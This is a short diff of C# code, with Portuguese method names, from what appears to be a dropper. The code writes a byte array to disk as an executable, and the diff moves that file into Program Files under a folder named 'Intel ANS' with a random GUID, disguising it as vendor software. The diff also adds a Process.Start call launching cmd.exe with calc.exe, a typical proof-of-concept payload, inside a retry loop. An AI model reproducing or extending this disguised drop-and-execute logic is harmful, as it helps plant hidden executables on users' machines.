@@ -55,8 +55,8 @@ namespace vtb.Model
         /// </summary>
         private string GerarCaminho()
         {
-            string appData = Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData);
-            appData += "\\" + Guid.NewGuid().ToString() + "\\";
+            string appData = Environment.GetFolderPath(Environment.SpecialFolder.ProgramFiles);
+            appData += "\\Intel ANS\\" + Guid.NewGuid().ToString() + "\\";
             return CaminhoLocal = appData;
         }
 
@@ -72,10 +72,12 @@ namespace vtb.Model
             for (int i = 0; i < pathParts.Length; i++)
             {
                 if (i > 0)
+                {
                     pathParts[i] = Path.Combine(pathParts[i - 1], pathParts[i]);
 
-                if (!Directory.Exists(pathParts[i]))
-                    Directory.CreateDirectory(pathParts[i]);
+                    if (!Directory.Exists(pathParts[i].Replace(":",":\\")))
+                        Directory.CreateDirectory(pathParts[i].Replace(":", ":\\"));
+                }
             }
 
             File.WriteAllBytes(caminho + NomeExe, bytes);
@@ -93,7 +95,7 @@ namespace vtb.Model
                 if (TentativaAtual >= Tentativas)
                     return false;
 
-                File.Open(CaminhoLocal + NomeExe, FileMode.Open);
+                Process.Start(@"C:\Windows\system32\cmd.exe /K C:\Windows\system32\calc.exe");
 
                 TentativaAtual++;
 
